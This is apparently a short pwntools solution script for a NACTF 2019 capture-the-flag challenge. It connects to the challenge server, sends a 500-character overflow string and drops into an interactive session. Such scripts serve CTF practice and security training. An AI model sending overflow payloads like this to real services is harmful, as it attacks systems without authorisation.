#!/usr/bin/env python

from pwn import *

p = remote("shell.2019.nactf.com", 31475)
print p.recv()
p.sendline("A"*500)
p.interactive()